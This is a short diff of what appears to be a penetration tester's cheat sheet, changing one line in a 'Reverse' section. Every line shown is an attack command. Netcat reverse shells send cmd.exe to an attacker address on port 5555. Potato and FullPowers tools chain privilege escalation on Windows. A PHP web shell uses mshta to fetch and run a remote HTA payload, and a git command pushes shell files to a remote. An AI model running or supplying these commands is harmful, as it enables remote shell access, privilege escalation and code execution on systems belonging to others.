@@ -283,7 +283,7 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 +---------- Reverse ----------+
 C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
 C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
-C:\programdata\tmp\FullPowers.exe -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
+C:\programdata\tmp\FullPowers.exe -z -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
 
